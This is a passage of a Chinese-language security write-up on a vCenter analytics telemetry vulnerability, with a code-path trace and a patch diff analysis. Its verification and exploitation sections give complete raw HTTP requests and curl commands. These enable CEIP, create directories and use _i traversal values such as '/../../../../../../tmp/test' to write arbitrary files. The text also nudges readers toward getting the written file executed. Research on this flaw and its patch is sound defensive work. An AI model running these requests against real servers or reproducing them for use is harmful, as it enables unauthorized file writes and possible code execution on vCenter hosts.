com.vmware.vsphere.client.h5.ceip.controller.CeipController  
还有其他两个接口
    GET /ui/ceip-ui/ctrl/ceip/status
    GET /ui/ceip-ui/ctrl/ceip/isAuthorized"
### LogTelemetryService
所以看来CEIP没有比较好的方案开启了。
    processTelemetry:56, LogTelemetryService (com.vmware.ph.phservice.push.telemetry)
    processTelemetry:45, TelemetryLevelBasedTelemetryServiceWrapper (com.vmware.ph.phservice.push.telemetry)
    run:66, AsyncTelemetryServiceWrapper$TelemetryRequestProcessorRunnable (com.vmware.ph.phservice.push.telemetry.internal.impl)
    call:511, Executors$RunnableAdapter (java.util.concurrent)
    run:266, FutureTask (java.util.concurrent)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
当ceip开启，继续跟踪到`com/vmware/ph/phservice/push/telemetry/LogTelemetryService#processTelemetry`，  
日志目录是`/var/log/vmware/analytics/prod`  
日志文件名则是，可以看到
    _c%1$s_i%2$s
继续往下就是日志记录，`this._logger`可以看到日志路径，而`serializeToLogMessage(telemetryRequest)`就是POST请求的body数据  
那么当请求参数`_c=vSphere.vapi.6_7&_i=/../../../../../../tmp/foo`  
则拼接为`/var/log/vmware/analytics/prod/_cvSphere.vapi.6_7_i/../../../../../../tmp/foo.json`  
但如果_cvSphere.vapi.6_7_i不存在，则会目录遍历失败，这个是linux的问题，所以必须先请求一次`_c=vSphere.vapi.6_7&_i=/temp`,log4j会创建目录，然后再请求上面URL，实现目录遍历。  
PS: prod目录默认也是没有的，vcenter自身正常会创建这个prod目录，但ceip没开启之前，是没有的，所以建议也请求下正常的参数。  
创建prod目录
    POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB HTTP/1.1
    Host: 192.168.111.11
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    X-Deployment-Secret: abc
    Content-Length: 3
    {}
创建_cvSphere.vapi.6_7_i目录
    POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=/temp HTTP/1.1
    Host: 192.168.111.11
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    X-Deployment-Secret: abc
    Content-Length: 3
    {}
由于后缀只能是json，所以无法直接写文件，那么可以写到一个可执行文件内容的路径，这个大家就自行发挥想象力找找linux上可执行的方法了。
    POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=/../../../../../../tmp/test HTTP/1.1
    Host: 192.168.111.11
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    X-Deployment-Secret: abc
    Content-Length: 4
    test
### 整理思路
  1. AsyncTelemetryController是/analytics/telemetry/ph/api/hyper/send请求处理入口，接收`_c`和`_i`参数
  2. 调用TelemetryLevelBasedTelemetryServiceWrapper#processTelemetry 发起ceip遥测请求，，成功后进一步处理`_c`和`_i`
  3. processTelemetry里调用`this._telemetryLevelService.getTelemetryLevel`来判断ceip遥测请求是否正常，这里也会传入`_c`和`_i`，如果开启成功可获取一个FULL值，除了需要开启ceip，还会对vmware的一个API接口发送请求，，需要注意的一点，如果之前没发起遥测请求，则对_c参数有要求，必须是一个合法的值，如果已经请求过，后续因为有缓存，不会再请求，则可成功通过校验。
  4. 如果ceip未开启，可通过/ui/ceip-ui/ctrl/ceip/status/true开启，但vcenter之前需要有人已经登录过一次，否则会出现接口未认证的报错。
  5. ceip请求成功后，processTelemetry接着调用LogTelemetryService#processTelemetry来解析`_c`和`_i`，log4j通过`_c$s_i$s`格式拼接日志路径，_i设置成如/../../../../../../tmp/test即可导致任意路径遍历写入文件，当`_c=vSphere.vapi.6_7&_i=/../../../../../../tmp/test`最终路径拼接如`/var/log/vmware/analytics/prod/_cvSphere.vapi.6_7_i/../../../../../../tmp/foo.json`，这里需要注意的是linux上目录遍历时需要遍历前的上级目录存在才可遍历。
## 验证
返回201表示漏洞存在
    POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB HTTP/1.1
    Host: 192.168.111.11
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
    Content-Length: 11
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Content-Type: application/json
    Accept-Encoding: gzip, deflate
    Connection: close
    lorem ipsum
## 利用
第一步判断ceip
    # 修改ceip
    curl -kv -X PUT "https://192.168.111.11/ui/ceip-ui/ctrl/ceip/status/true" -d "{}" -H "Content-Type: application/json"
    # 判断ceip是否启动
    curl -k -v "https://192.168.111.11/analytics/telemetry/ph/api/level?_c=vSphere.vapi.6_7"
/var/log/vmware/analytics/prod创建 `prod`和`_cvSphere.vapi.6_7_i`  
_i参数每次都要修改，因为文件如果被删除，就不会再次被创建了
    POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=temp HTTP/1.1
    Host: 192.168.111.11
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    X-Deployment-Secret: abc
    Content-Length: 3
    {}
    POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=/temp HTTP/1.1
    Host: 192.168.111.11
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    X-Deployment-Secret: abc
    Content-Length: 3
    {}
写任意路径文件
    POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=/../../../../../../tmp/test HTTP/1.1
    Host: 192.168.111.11
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    X-Deployment-Secret: abc
    Content-Length: 4
    test
## 补丁分析
补丁包  
VMware-analytics-6.7.0-18408195.x86_64.rpm，解压出来就是各种jar包和其他一些配置文件，对比jar包，定位到如下  
对比补丁，补丁在AsyncTelemetryController#handleSendRequest里新增了一个条件判断  
判断语句
    (IdFormatUtil.isValidCollectorInstanceId(collectorInstanceId) && AsyncTelemetryController.this._collectorIdWhitelist.contains(collectorId))
IdFormatUtil.class在analytics-6.7.0.jar里  
collectorInstanceId正则过滤`[\\w-]{1,64}`
=`[A-Za-z0-9_-]{1,64}`，如9D36C850-1612-4EC4-B8DD-50BA239A25BB，没法使用.和/，所以这个绕不过了  
collectorId `[a-zA-Z][\w-\.]{1,40}[a-zA-Z0-9]`, 如vSphere.vapi.6_7，也没法使用/，但没调用。  
collectorId是用一个白名单，需要调试才能最终确定白名单内容，但根据上面的正则也能大致猜测，这里的白名单估计和之前ceip
遥测请求的API接口是一样的。  
this._collectorIdWhitelist为在控制器初始化的传入  
另外除了公开的漏洞利用点之外，AsyncTelemetryController还有两个私有类也有patch，都是Callable的实现类（即多线程），这里会检查collectorId  
另一个和之前漏洞点判断是一样的。  
那么是否可以找到其他没做过滤的telemetryService.processTelemetry调用点，在这之前其实还需要检查下processTelemetry内部是否还有patch。  
这里调用的实现类是TelemetryLevelBasedTelemetryServiceWrapper，另一个相关的是LogTelemetryService  
TelemetryLevelBasedTelemetryServiceWrapper在analytics-6.7.0.jar里，但对比了补丁，没发现直接的改动。  
但有其他几处DataAppAgentId做了相同的过滤，这就涉及到另一个漏洞点了。  
LogTelemetryService在同个包里，也没做修改。